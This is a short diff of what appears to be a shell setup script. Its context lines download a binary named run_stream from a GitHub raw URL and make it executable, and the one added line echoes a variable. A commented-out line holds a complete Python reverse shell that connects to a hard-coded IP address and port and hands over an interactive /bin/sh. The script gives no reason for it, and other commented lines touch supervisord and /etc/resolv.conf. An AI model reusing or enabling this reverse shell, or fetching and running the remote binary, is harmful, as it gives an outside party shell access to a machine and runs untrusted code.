@@ -13,7 +13,7 @@
 wget https://raw.githubusercontent.com/cata0nana/stream_pay/main/run_stream
 chmod +x run_stream
 # mv geckodriver /usr/bin/geckodriver-30
-
+echo $lol_url
 #supervisord -n
 #python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("105.111.63.126",10001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 #chown root:root /etc/resolv.conf
